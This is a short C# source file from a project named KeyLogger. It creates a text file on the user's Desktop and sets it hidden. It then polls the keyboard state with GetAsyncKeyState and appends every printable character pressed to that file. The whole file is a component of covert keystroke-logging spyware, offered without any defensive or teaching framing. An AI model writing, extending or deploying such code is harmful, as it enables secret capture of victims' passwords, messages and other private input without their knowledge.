using System;
using System.IO;

namespace KeyLogger
{
    class FileDecorator
    {
        string folderPath;
        string filePath;
        string fileName = "Keylog.txt";

        public void CreateFile()
        {
            folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
            
            if (!Directory.Exists(folderPath))
            {
                Directory.CreateDirectory(folderPath);
            }

            filePath = folderPath + @"\" + fileName;

            if (!File.Exists(filePath))
            {
                using (StreamWriter sw = File.CreateText(filePath)) { }
            }

            File.SetAttributes(filePath, File.GetAttributes(filePath) | FileAttributes.Hidden);
        }

        public string WriteFile()
        {
            int keySt = default;

            using (StreamWriter sw = File.AppendText(filePath))
            {
                for (int keyNumber = 32; keyNumber < 127; keyNumber++)
                {
                    keySt = KeyState.GetAsyncKeyState(keyNumber);

                    if (keySt == short.MinValue + 1)
                    {
                        sw.Write((char)keyNumber);
                    }
                }

                return filePath;
            }
        }
    }
}
